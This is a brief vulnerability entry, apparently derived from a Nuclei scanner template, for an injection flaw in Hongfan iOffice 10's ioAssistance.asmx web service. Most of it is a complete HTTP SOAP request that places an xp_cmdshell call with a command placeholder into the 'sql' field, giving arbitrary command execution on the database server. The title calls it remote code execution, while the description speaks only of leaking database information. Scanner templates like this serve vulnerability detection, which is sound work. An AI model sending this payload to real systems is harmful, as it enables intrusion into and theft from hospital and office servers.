# Vulnerability: Hongfan OA ioAssistance.asmx - Remote Code Execution
**Classification:** HONGFAN
**Source:** Nuclei Template (`hongfan-ioffice-rce.yaml`)

## Description
There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attackers to obtain sensitive database information.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
      <sql>exec master.dbo.xp_cmdshell '{{command}}'</sql>
    </GetLoginedEmpNoReadedInf>
  </soap:Body>
</soap:Envelope>
```

